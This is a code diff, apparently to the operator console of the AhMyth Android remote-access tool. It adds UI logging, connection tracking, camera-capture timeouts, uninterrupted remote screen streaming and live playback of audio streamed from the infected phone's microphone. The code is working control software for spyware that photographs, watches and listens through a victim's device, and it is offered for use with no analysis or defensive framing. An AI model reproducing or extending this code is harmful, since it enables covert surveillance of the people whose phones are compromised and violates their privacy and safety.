@@ -65,7 +65,17 @@ if (!fs.existsSync(logPath)) {
 // Debug log file
 var debugLogFile = path.join(logPath, `debug-${new Date().toISOString().split('T')[0]}.log`);
 
-// Log to file function
+// Store reference to Angular scope for UI logging (set later by controller)
+var labScope = null;
+var rootScope = null;
+
+// Set the scope reference from controller
+function setLabScope(scope, root) {
+    labScope = scope;
+    rootScope = root;
+}
+
+// Log to file function AND to UI Activity Log
 function logToFile(type, command, data) {
     const timestamp = new Date().toISOString();
     const dataStr = typeof data === 'object' ? JSON.stringify(data, null, 2) : String(data || '');
@@ -78,26 +88,73 @@ function logToFile(type, command, data) {
         console.error('Error writing to debug log:', e);
     }
     
-    // Also log to console for immediate visibility
+    // Log to console
     console.log(`[AhMyth ${type}] ${command}:`, dataStr.substring(0, 500));
+    
+    // Log to UI Activity Log panel
+    if (rootScope && rootScope.Log) {
+        const shortData = dataStr.length > 100 ? dataStr.substring(0, 100) + '...' : dataStr;
+        if (type === 'REQUEST') {
+            rootScope.Log(`[→ REQ] ${command}: ${shortData}`, CONSTANTS.logStatus.INFO);
+        } else if (type === 'RESPONSE') {
+            // Check if response indicates success or error
+            if (dataStr.includes('"error"') || dataStr.includes('"success":false')) {
+                rootScope.Log(`[← RES] ${command}: ${shortData}`, CONSTANTS.logStatus.FAIL);
+            } else {
+                rootScope.Log(`[← RES] ${command}: ${shortData}`, CONSTANTS.logStatus.SUCCESS);
+            }
+        }
+        // Trigger Angular digest if needed
+        try {
+            if (rootScope && !rootScope.$$phase) {
+                rootScope.$apply();
+            }
+        } catch (e) {}
+    }
 }
 
-// Wrap socket with logging
+// Track registered listeners to avoid double-registration
+var registeredListeners = {};
+
+// Wrap socket with logging - improved version that tracks listeners
 var socket = {
     emit: function(event, data) {
         logToFile('REQUEST', event, data);
+        if (labScope) labScope.packetCount++;
         return originalSocket.emit(event, data);
     },
     on: function(event, callback) {
+        // Track registration to prevent duplicate listeners
+        if (registeredListeners[event]) {
+            console.log(`[AhMyth] Listener already registered for ${event}, replacing...`);
+            originalSocket.removeAllListeners(event);
+        }
+        registeredListeners[event] = true;
+        
         return originalSocket.on(event, function(data) {
             logToFile('RESPONSE', event, data);
-            callback(data);
+            if (labScope) labScope.packetCount++;
+            try {
+                callback(data);
+            } catch (e) {
+                console.error(`[AhMyth] Error in callback for ${event}:`, e);
+                if (rootScope && rootScope.Log) {
+                    rootScope.Log(`[✗] Error processing ${event}: ${e.message}`, CONSTANTS.logStatus.FAIL);
+                }
+            }
         });
     },
     removeAllListeners: function(event) {
+        delete registeredListeners[event];
         return originalSocket.removeAllListeners(event);
+    },
+    connected: function() {
+        return originalSocket && originalSocket.connected;
     }
 };
+
+// Export setLabScope for controller access
+window.setLabScope = setLabScope;
 
 //-----------------------Routing Config------------------------
 app.config(function ($routeProvider, $locationProvider) {
@@ -193,9 +250,52 @@ app.config(function ($routeProvider, $locationProvider) {
 
 //-----------------------LAB Controller (lab.htm)------------------------
 // controller for Lab.html and its views mic.html,camera.html..etc
-app.controller("LabCtrl", function ($scope, $rootScope, $location, $route) {
+app.controller("LabCtrl", function ($scope, $rootScope, $location, $route, $interval) {
     $labCtrl = $scope;
     $labCtrl.logs = [];
+    $labCtrl.isConnected = true; // Start as connected since lab opens on connection
+    $labCtrl.sessionId = Date.now().toString(36).toUpperCase();
+    $labCtrl.uptime = '00:00:00';
+    $labCtrl.packetCount = 0;
+    
+    // Enable UI logging by setting scope reference
+    if (window.setLabScope) {
+        window.setLabScope($scope, $rootScope);
+        console.log('[AhMyth Lab] UI logging enabled');
+    }
+    
+    var startTime = Date.now();
+    
+    // Update uptime every second
+    $interval(() => {
+        var elapsed = Math.floor((Date.now() - startTime) / 1000);
+        var hours = Math.floor(elapsed / 3600);
+        var minutes = Math.floor((elapsed % 3600) / 60);
+        var seconds = elapsed % 60;
+        $labCtrl.uptime = String(hours).padStart(2, '0') + ':' + 
+                         String(minutes).padStart(2, '0') + ':' + 
+                         String(seconds).padStart(2, '0');
+    }, 1000);
+    
+    // Track connection by checking socket state directly
+    $interval(() => {
+        try {
+            // Check if the original socket is connected
+            if (originalSocket && originalSocket.connected) {
+                if (!$labCtrl.isConnected) {
+                    $labCtrl.isConnected = true;
+                    $rootScope.Log('[✓] Connection active', CONSTANTS.logStatus.SUCCESS);
+                }
+            } else {
+                if ($labCtrl.isConnected) {
+                    $labCtrl.isConnected = false;
+                    $rootScope.Log('[⚠] Connection lost', CONSTANTS.logStatus.WARNING);
+                }
+            }
+        } catch (e) {
+            // Socket check failed
+        }
+    }, 3000);
 
     // Wait for DOM to be ready and initialize routing
     setTimeout(() => {
@@ -326,11 +426,18 @@ app.controller("LabCtrl", function ($scope, $rootScope, $location, $route) {
 
 
 
+    // Refresh current view data
+    $labCtrl.refreshData = () => {
+        $rootScope.Log('[→] Refreshing data...', CONSTANTS.logStatus.INFO);
+        $route.reload();
+    };
+
     // to move from view to another
     $labCtrl.goToPage = (page) => {
         try {
             const path = '/' + page;
             console.log('[AhMyth Lab] Navigating to:', path);
+            $labCtrl.packetCount++;
             $location.path(path);
             if (!$scope.$$phase && !$scope.$root.$$phase) {
                 $scope.$apply();
@@ -367,35 +474,66 @@ app.controller("LabCtrl", function ($scope, $rootScope, $location, $route) {
 
 //-----------------------Camera Controller (camera.htm)------------------------
 // camera controller
-app.controller("CamCtrl", function ($scope, $rootScope) {
+app.controller("CamCtrl", function ($scope, $rootScope, $timeout) {
     $camCtrl = $scope;
     $camCtrl.isSaveShown = false;
     $camCtrl.cameras = [];
     $camCtrl.selectedCam = null;
     $camCtrl.imgUrl = null;
     $camCtrl.load = '';
+    $camCtrl.lastError = null;
     var camera = CONSTANTS.orders.camera;
     var currentBase64 = null;
+    var responseTimeout = null;
 
     // remove socket listener
     $camCtrl.$on('$destroy', () => {
         socket.removeAllListeners(camera);
+        if (responseTimeout) $timeout.cancel(responseTimeout);
     });
+
+    // Check socket connection before sending commands
+    function checkConnection() {
+        if (!originalSocket || !originalSocket.connected) {
+            $rootScope.Log('[✗] Not connected to device!', CONSTANTS.logStatus.FAIL);
+            $camCtrl.load = '';
+            $camCtrl.lastError = 'Device not connected';
+            return false;
+        }
+        return true;
+    }
+
+    // Set timeout for response
+    function setResponseTimeout(action, timeoutMs) {
+        if (responseTimeout) $timeout.cancel(responseTimeout);
+        responseTimeout = $timeout(() => {
+            if ($camCtrl.load === 'loading') {
+                $camCtrl.load = '';
+                $camCtrl.lastError = `No response from device for ${action}. Check if permissions are granted.`;
+                $rootScope.Log(`[⚠] Timeout waiting for ${action} response. Device may need camera permission.`, CONSTANTS.logStatus.WARNING);
+            }
+        }, timeoutMs || 30000);
+    }
 
     // Select camera
     $camCtrl.selectCamera = (cam) => {
         $camCtrl.selectedCam = cam;
+        $camCtrl.lastError = null;
         $rootScope.Log(`[ℹ] Selected: ${cam.name || (cam.id == 0 ? 'Back Camera' : 'Front Camera')}`, CONSTANTS.logStatus.INFO);
     };
 
     // Take picture
     $camCtrl.snap = () => {
+        if (!checkConnection()) return;
+        
         if (!$camCtrl.selectedCam) {
             $rootScope.Log('[⚠] Please select a camera first', CONSTANTS.logStatus.WARNING);
             return;
         }
         $camCtrl.load = 'loading';
-        $rootScope.Log('[→] Taking picture...', CONSTANTS.logStatus.INFO);
+        $camCtrl.lastError = null;
+        $rootScope.Log(`[→] Taking picture with camera ID: ${$camCtrl.selectedCam.id}...`, CONSTANTS.logStatus.INFO);
+        setResponseTimeout('camera capture', 30000);
         socket.emit(ORDER, { order: camera, extra: String($camCtrl.selectedCam.id) });
     };
 
@@ -420,9 +558,21 @@ app.controller("CamCtrl", function ($scope, $rootScope) {
         }
     };
 
-    // Socket handler
+    // Socket handler - improved with error handling
     socket.on(camera, (data) => {
+        if (responseTimeout) $timeout.cancel(responseTimeout);
         $camCtrl.load = '';
+        $camCtrl.lastError = null;
+        
+        console.log('[CamCtrl] Received camera data:', data);
+        
+        // Handle error responses
+        if (data.error) {
+            $camCtrl.lastError = data.error;
+            $rootScope.Log(`[✗] Camera error: ${data.error}`, CONSTANTS.logStatus.FAIL);
+            $camCtrl.$apply();
+            return;
+        }
         
         if (data.camList == true) {
             $rootScope.Log(`[✓] Found ${data.list.length} camera(s)`, CONSTANTS.logStatus.SUCCESS);
@@ -435,24 +585,44 @@ app.controller("CamCtrl", function ($scope, $rootScope) {
         } else if (data.image == true) {
             $rootScope.Log('[✓] Picture captured', CONSTANTS.logStatus.SUCCESS);
             
-            // Convert binary to base64
-            var uint8Arr = new Uint8Array(data.buffer);
-            var binary = '';
-            for (var i = 0; i < uint8Arr.length; i++) {
-                binary += String.fromCharCode(uint8Arr[i]);
+            // Handle buffer data
+            if (data.buffer) {
+                try {
+                    var uint8Arr = new Uint8Array(data.buffer);
+                    var binary = '';
+                    for (var i = 0; i < uint8Arr.length; i++) {
+                        binary += String.fromCharCode(uint8Arr[i]);
+                    }
+                    currentBase64 = window.btoa(binary);
+                    
+                    $camCtrl.imgUrl = 'data:image/jpeg;base64,' + currentBase64;
+                    $camCtrl.isSaveShown = true;
+                    $rootScope.Log(`[✓] Image received: ${Math.round(uint8Arr.length/1024)} KB`, CONSTANTS.logStatus.SUCCESS);
+                } catch (e) {
+                    console.error('[CamCtrl] Error processing image:', e);
+                    $camCtrl.lastError = 'Error processing image data';
+                    $rootScope.Log(`[✗] Error processing image: ${e.message}`, CONSTANTS.logStatus.FAIL);
+                }
+            } else {
+                $camCtrl.lastError = 'No image buffer in response';
+                $rootScope.Log('[✗] No image buffer received', CONSTANTS.logStatus.FAIL);
             }
-            currentBase64 = window.btoa(binary);
-            
-            $camCtrl.imgUrl = 'data:image/jpeg;base64,' + currentBase64;
-            $camCtrl.isSaveShown = true;
+            $camCtrl.$apply();
+        } else if (data.image == false) {
+            // Explicit failure
+            $camCtrl.lastError = data.error || 'Camera capture failed';
+            $rootScope.Log(`[✗] Camera capture failed: ${data.error || 'Unknown error'}`, CONSTANTS.logStatus.FAIL);
             $camCtrl.$apply();
         }
     });
 
-    // Initial load - get camera list
-    $rootScope.Log('[→] Fetching camera list...', CONSTANTS.logStatus.INFO);
-    $camCtrl.load = 'loading';
-    socket.emit(ORDER, { order: camera, extra: 'camList' });
+    // Initial load - get camera list with connection check
+    if (checkConnection()) {
+        $rootScope.Log('[→] Fetching camera list...', CONSTANTS.logStatus.INFO);
+        $camCtrl.load = 'loading';
+        setResponseTimeout('camera list', 15000);
+        socket.emit(ORDER, { order: camera, extra: 'camList' });
+    }
 });
 
 
@@ -1623,12 +1793,18 @@ app.controller("ScreenCtrl", function ($scope, $rootScope, $interval, $timeout) 
             } else if (data.error && data.error.toLowerCase().includes('permission')) {
                 $ScreenCtrl.permissionRequired = true;
                 $rootScope.Log('[⚠] Screen capture permission required on device', CONSTANTS.logStatus.WARNING);
+            } else if (data.error && (data.error.toLowerCase().includes('no image') || data.error.toLowerCase().includes('unavailable'))) {
+                // Don't stop streaming on temporary image errors - just log and continue
+                $rootScope.Log('[⚠] Waiting for screen data...', CONSTANTS.logStatus.WARNING);
+                // Don't stop streaming, just wait for next frame
             } else {
                 $rootScope.Log(`[✗] Screen error: ${data.error || 'Unknown'}`, CONSTANTS.logStatus.FAIL);
-            }
-            
-            if ($ScreenCtrl.isStreaming) {
-                $ScreenCtrl.stopStream();
+                // Only stop streaming on critical errors, not temporary ones
+                if (data.error && !data.error.toLowerCase().includes('timeout')) {
+                    if ($ScreenCtrl.isStreaming) {
+                        // Don't auto-stop, let user decide
+                    }
+                }
             }
         } else if (data.message && data.message.includes('permission')) {
             // Permission request sent successfully
@@ -2060,19 +2236,108 @@ app.controller("LiveMicCtrl", function ($scope, $rootScope, $interval) {
     $LiveMicCtrl.isStreaming = false;
     $LiveMicCtrl.streamDuration = '00:00:00';
     $LiveMicCtrl.audioChunks = 0;
+    $LiveMicCtrl.volume = 100;
+    $LiveMicCtrl.isMuted = false;
     
     var liveMic = CONSTANTS.orders.liveMic || 'x0000lm2';
     var streamTimer = null;
     var startTime = null;
     var audioContext = null;
+    var gainNode = null;
+    var audioQueue = [];
+    var isPlaying = false;
+
+    // Initialize Web Audio API
+    function initAudio() {
+        try {
+            audioContext = new (window.AudioContext || window.webkitAudioContext)({
+                sampleRate: 44100
+            });
+            gainNode = audioContext.createGain();
+            gainNode.connect(audioContext.destination);
+            gainNode.gain.value = $LiveMicCtrl.volume / 100;
+            $rootScope.Log('[✓] Audio context initialized', CONSTANTS.logStatus.SUCCESS);
+        } catch (e) {
+            $rootScope.Log(`[✗] Failed to init audio: ${e.message}`, CONSTANTS.logStatus.FAIL);
+        }
+    }
+
+    // Play audio buffer
+    function playAudioChunk(audioData) {
+        if (!audioContext || audioContext.state === 'closed') return;
+        
+        try {
+            // Resume audio context if suspended (browser autoplay policy)
+            if (audioContext.state === 'suspended') {
+                audioContext.resume();
+            }
+            
+            // Convert base64 or binary data to ArrayBuffer
+            var arrayBuffer;
+            if (typeof audioData === 'string') {
+                // Base64 encoded
+                var binary = atob(audioData);
+                arrayBuffer = new ArrayBuffer(binary.length);
+                var bytes = new Uint8Array(arrayBuffer);
+                for (var i = 0; i < binary.length; i++) {
+                    bytes[i] = binary.charCodeAt(i);
+                }
+            } else if (audioData.buffer) {
+                // Binary data from socket
+                arrayBuffer = new Uint8Array(audioData.buffer).buffer;
+            } else {
+                arrayBuffer = audioData;
+            }
+            
+            // Decode and play audio
+            audioContext.decodeAudioData(arrayBuffer, function(buffer) {
+                var source = audioContext.createBufferSource();
+                source.buffer = buffer;
+                source.connect(gainNode);
+                source.start(0);
+            }, function(err) {
+                // Try raw PCM playback if decode fails
+                playRawPCM(arrayBuffer);
+            });
+        } catch (e) {
+            console.error('Audio playback error:', e);
+        }
+    }
+    
+    // Play raw PCM data (fallback)
+    function playRawPCM(arrayBuffer) {
+        try {
+            var samples = new Int16Array(arrayBuffer);
+            var floatSamples = new Float32Array(samples.length);
+            for (var i = 0; i < samples.length; i++) {
+                floatSamples[i] = samples[i] / 32768.0;
+            }
+            
+            var buffer = audioContext.createBuffer(1, floatSamples.length, 44100);
+            buffer.getChannelData(0).set(floatSamples);
+            
+            var source = audioContext.createBufferSource();
+            source.buffer = buffer;
+            source.connect(gainNode);
+            source.start(0);
+        } catch (e) {
+            console.error('Raw PCM playback error:', e);
+        }
+    }
 
     $LiveMicCtrl.$on('$destroy', () => {
         socket.removeAllListeners(liveMic);
         if (streamTimer) $interval.cancel(streamTimer);
-        if (audioContext) audioContext.close();
+        if (audioContext && audioContext.state !== 'closed') {
+            audioContext.close();
+        }
     });
 
     $LiveMicCtrl.startStream = () => {
+        if (!audioContext) {
+            initAudio();
+        }
+        
         $LiveMicCtrl.isStreaming = true;
         $LiveMicCtrl.audioChunks = 0;
         startTime = Date.now();
@@ -2104,12 +2369,26 @@ app.controller("LiveMicCtrl", function ($scope, $rootScope, $interval) {
             streamTimer = null;
         }
     };
+    
+    $LiveMicCtrl.setVolume = (vol) => {
+        $LiveMicCtrl.volume = vol;
+        if (gainNode) {
+            gainNode.gain.value = $LiveMicCtrl.isMuted ? 0 : vol / 100;
+        }
+    };
+    
+    $LiveMicCtrl.toggleMute = () => {
+        $LiveMicCtrl.isMuted = !$LiveMicCtrl.isMuted;
+        if (gainNode) {
+            gainNode.gain.value = $LiveMicCtrl.isMuted ? 0 : $LiveMicCtrl.volume / 100;
+        }
+    };
 
     socket.on(liveMic, (data) => {
         if (data.audio) {
             $LiveMicCtrl.audioChunks++;
-            // Audio playback would go here
-            // For now just count chunks
+            // Play the received audio data
+            playAudioChunk(data.audio);
         } else if (data.started) {
             $rootScope.Log('[✓] Live microphone streaming started', CONSTANTS.logStatus.SUCCESS);
         } else if (data.stopped) {
